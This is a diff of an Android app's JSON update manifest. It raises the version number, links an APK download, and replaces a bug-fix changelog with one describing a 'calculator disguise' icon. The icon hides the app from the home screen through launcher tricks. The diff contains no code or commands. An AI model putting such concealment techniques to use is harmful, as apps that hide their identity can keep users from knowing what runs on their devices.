@@ -1,8 +1,8 @@
 {
-  "version_code": 44,
-  "version_name": "7.8.1",
+  "version_code": 45,
+  "version_name": "7.8.2",
   "apk_url": "https://netmirrorr.onrender.com/downloadapp/fullupdate.apk",
-  "changelog": "CRITICAL FIX: Resolved launch-loop bug where app opened and closed continuously after permissions granted. Added one-shot guard to recents cleanup, fixed CrashLogger FGS exception handling, changed PersistentService to START_NOT_STICKY, added singleTask launch mode.",
+  "changelog": "Calculator disguise icon now hides from home screen only (still visible in app drawer). Home-screen cleanup routine uses ShortcutManager + double-toggle trick + PACKAGE_CHANGED broadcast. Best-effort across OEM launchers.",
   "is_mandatory": false,
   "poster_url": "",
   "minSdk": 26,
